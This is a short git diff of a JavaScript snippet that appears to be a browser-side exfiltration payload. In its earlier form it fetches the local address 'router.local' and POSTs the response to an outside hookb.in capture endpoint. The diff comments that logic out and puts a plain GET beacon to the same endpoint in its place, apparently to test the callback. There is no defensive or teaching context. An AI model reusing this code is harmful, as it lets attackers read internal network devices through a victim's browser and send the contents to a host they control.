@@ -1,7 +1,13 @@
 const ROUTER = "http://router.local";
 const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 
-function forwardResponse(res) {
+let xhr = new XMLHttpRequest();
+
+xhr.open("GET", ENDPOINT, true);
+xhr.send('');
+
+
+/*function forwardResponse(res) {
 	let fwdxhr = new XMLHttpRequest();
 	fwdxhr.open("POST", ENDPOINT, true);
 	fwdxhr.setRequestHeader("Content-Type", "application/json");
@@ -23,4 +29,4 @@ xhr.onreadystatechange = function() {
 }
 
 xhr.open("GET", ROUTER, true);
-xhr.send('');
+xhr.send('');*/
